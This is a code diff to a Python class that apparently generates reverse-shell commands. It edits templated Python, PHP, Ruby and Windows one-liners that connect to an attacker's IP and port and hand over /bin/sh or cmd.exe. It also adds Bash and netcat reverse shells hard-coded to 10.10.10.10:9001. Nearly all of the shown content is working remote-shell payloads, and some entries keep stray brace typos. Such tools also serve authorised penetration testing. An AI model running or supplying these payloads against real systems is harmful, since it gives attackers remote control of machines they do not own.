@@ -7,10 +7,10 @@ class ReverseShellCommands:
             1: {
                 'name': 'Python Linux only IPv4',
                 'command': [
-                    "export RHOST='{ip}';export RPORT={port}};python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
-                    "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
-                    "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}}\",{port}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
-                    "python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}}\",{port}}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
+                    "export RHOST='{ip}';export RPORT={port};python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
+                    "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
+                    "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+                    "python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}}\",{port}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
                 ]
             },
             2: {
@@ -50,33 +50,33 @@ class ReverseShellCommands:
             7: {
                 'name': 'Windows only (Python2)',
                 'command': [
-                    "python.exe -c \"(lambda __y, __g, __contextlib: ...s.connect(('{ip}', {port})), ...subprocess.Popen(['\\windows\\system32\\cmd.exe'], ...\""
+                    "python.exe -c \"(lambda __y, __g, __contextlib: ...s.connect((\'{ip}\', {port})), ...subprocess.Popen([\\'\\windows\\system32\\cmd.exe\\'], ...\""
                 ]
             },
             8: {
                 'name': 'Windows only (Python3)',
                 'command': [
-                    "python.exe -c \"import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('{ip}',{port}));threading.Thread(target=exec,args=('while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)',globals()),daemon=True).start();threading.Thread(target=exec,args=('while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)',globals())).start()\""
+                    "python.exe -c \"import socket,os,threading,subprocess as sp;p=sp.Popen([\'cmd.exe\'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((\'{ip}\',{port}));threading.Thread(target=exec,args=(\'while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\',globals()),daemon=True).start();threading.Thread(target=exec,args=(\'while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\',globals())).start()\""
                 ]
             },
             9: {
                 'name': 'PHP',
                 'command': [
-                    'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
-                    'php -r \'$sock=fsockopen("{ip}",{port});shell_exec("/bin/sh -i <&3 >&3 2>&3");\'',
-                    'php -r \'$sock=fsockopen("{ip}",{port});`/bin/sh -i <&3 >&3 2>&3`;\'',
-                    'php -r \'$sock=fsockopen("{ip}",{port});system("/bin/sh -i <&3 >&3 2>&3");\'',
-                    'php -r \'$sock=fsockopen("{ip}",{port});passthru("/bin/sh -i <&3 >&3 2>&3");\'',
-                    'php -r \'$sock=fsockopen("{ip}",{port});popen("/bin/sh -i <&3 >&3 2>&3", "r");\'',
-                    'php -r \'$sock=fsockopen("{ip}",{port});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\''
+                    'php -r \"$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");\"',
+                    'php -r \"$sock=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");\"',
+                    'php -r \"$sock=fsockopen(\"{ip}\",{port});`/bin/sh -i <&3 >&3 2>&3`;\"',
+                    'php -r \"$sock=fsockopen(\"{ip}\",{port});system(\"/bin/sh -i <&3 >&3 2>&3\");\"',
+                    'php -r \"$sock=fsockopen(\"{ip}\",{port});passthru(\"/bin/sh -i <&3 >&3 2>&3\");\"',
+                    'php -r \"$sock=fsockopen(\"{ip}\",{port});popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");\"',
+                    'php -r \"$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\"'
                 ]
             },
             10: {
                 'name': 'Ruby',
                 'command': [
-                    'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
-                    'ruby -rsocket -e\'exit if fork;c=TCPSocket.new("{ip}","{port}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}\'',
-                    'ruby -rsocket -e \'c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''
+                    'ruby -rsocket -e\"f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)\"',
+                    'ruby -rsocket -e\"exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}\"',
+                    'ruby -rsocket -e \"c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end\"'
                 ]
             },
             11: {
@@ -86,7 +86,7 @@ class ReverseShellCommands:
                     'use std::os::unix::io::{AsRawFd, FromRawFd};',
                     'use std::process::{Command, Stdio};',
                     'fn main() {',
-                    '    let s = TcpStream::connect("{ip}:{port}").unwrap();',  #Dynamic IP and port
+                    '    let s = TcpStream::connect("{ip}:{port}").unwrap();',
                     '    let fd = s.as_raw_fd();',
                     '    Command::new("/bin/sh")',
                     '        .arg("-i")',
@@ -106,6 +106,42 @@ class ReverseShellCommands:
                     "echo 'package main;import \"os/exec\";import \"net\";func main() {c, _ := net.Dial(\"tcp\", \"{ip}:{port}\"); cmd := exec.Command(\"/bin/sh\"); cmd.Stdin = c; cmd.Stdout = c; cmd.Stderr = c; cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
                 ]
             },
+            13: {
+                'name': 'Bash -i',
+                'command': [
+                    "sh -i >& /dev/tcp/10.10.10.10/9001 0>&1"
+                ]
+            },
+            14: {
+                'name': 'Bash 196',
+                'command': [
+                    "0<&196;exec 196<>/dev/tcp/10.10.10.10/9001; sh <&196 >&196 2>&196"
+                ]
+            },
+            15: {
+                'name': 'Bash read line',
+                'command': [
+                    "exec 5<>/dev/tcp/10.10.10.10/9001;cat <&5 | while read line; do $line 2>&5 >&5; done"
+                ]
+            },
+            16: {
+                'name': 'Bash 5',
+                'command': [
+                    "sh -i 5<> /dev/tcp/10.10.10.10/9001 0<&5 1>&5 2>&5"
+                ]
+            },
+            17: {
+                'name': 'Bash udp',
+                'command': [
+                    "sh -i >& /dev/udp/10.10.10.10/9001 0>&1"
+                ]
+            },
+            18: {
+                'name': 'nc mkfifo',
+                'command': [
+                    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f"
+                ]
+            }
         }
 
     def get_command(self, option, port, ip):
